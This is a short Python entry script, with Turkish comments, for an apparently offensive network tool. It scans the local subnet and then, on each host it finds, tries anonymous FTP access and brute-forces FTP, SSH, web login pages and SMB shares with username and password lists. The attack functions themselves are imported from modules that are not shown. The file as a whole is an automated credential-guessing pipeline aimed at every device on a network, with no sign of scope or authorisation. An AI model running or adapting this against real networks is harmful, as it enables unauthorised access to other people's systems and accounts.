from tools.web import find_login_page, web_brute_force
from tools.ftp import check_anonymous_access, ftp_brute_force
from tools.ssh import ssh_brute_force
from tools.smb import check_smb_ports, enum_smb_shares, smb_brute_force, check_smb_version
from config import get_username_list, get_password_list, select_interface, get_local_ip, scan_network

# Ana çalışma fonksiyonu
def main():
    interface = select_interface()
    local_ip = get_local_ip(interface)
    print(f"[ IP ] Local IP: {local_ip}")

    network_range = local_ip.rsplit('.', 1)[0] + ".0/24"
    print(f"[ NMAP] Network range: {network_range}")
    print("[ NMAP ] Ağ taraması başlatıldı...")
    devices = scan_network(network_range)

    for ip, ports in devices.items():
        print(f"[+] {ip} adresinde açık portlar: {ports}")

        # FTP portu bulunursa
        if 21 in ports:
            check_anonymous_access(ip)
            username_list = get_username_list()
            password_list = get_password_list()
            ftp_brute_force(ip, username_list, password_list)   

        # SSH portu bulunursa
        if 22 in ports:
            username_list = get_username_list()
            password_list = get_password_list()
            ssh_brute_force(ip, username_list, password_list)

        # HTTP portu bulunursa
        if 80 in ports:
            login_url = find_login_page(ip)
            if login_url:
                username_list = get_username_list()
                password_list = get_password_list()
                
                web_brute_force(login_url, username_list, password_list)
        
        # SMB portları bulunursa (139 veya 445)
        if 139 in ports or 445 in ports:
            print(f"[ SMB ] {ip} adresinde SMB servisi tespit edildi")
            smb_version = check_smb_version(ip)
            
            # Anonim erişim denemesi
            shares = enum_smb_shares(ip, '', '')
            
            if not shares:
                # Brute force dene
                username_list = get_username_list()
                password_list = get_password_list()
                smb_brute_force(ip, username_list, password_list)

if __name__ == "__main__":
    main()
